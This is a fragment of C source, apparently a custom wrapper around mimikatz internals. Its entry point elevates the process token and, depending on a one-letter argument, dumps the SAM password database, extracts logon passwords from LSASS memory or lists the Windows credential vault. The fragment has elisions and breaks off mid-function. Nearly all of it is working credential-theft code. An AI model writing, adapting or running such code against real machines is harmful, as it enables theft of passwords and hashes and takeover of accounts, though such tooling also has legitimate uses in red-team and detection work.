...
int wmain(int argc, wchar_t * argv[])
{
	...
	// functions from mimikatz_begin(); they are needed for logonpasswords output
	kull_m_output_init();
	mimikatz_initOrClean(TRUE);

	kuhl_m_token_elevate(0, "token::elevate"); // required for SAM dump
	
	if (argc > 1) {
		if (strcmp(argv[1], "s") == 0) {
			kuhl_m_lsadump_sam(0, 0, "lsadump::sam");
		}
		else if (strcmp(argv[1], "l") == 0) {
			kuhl_m_sekurlsa_all(0, "sekurlsa::logonPasswords");
		}
		else if (strcmp(argv[1], "v") == 0) {
			kuhl_m_vault_list(0, "vault::list");
		}
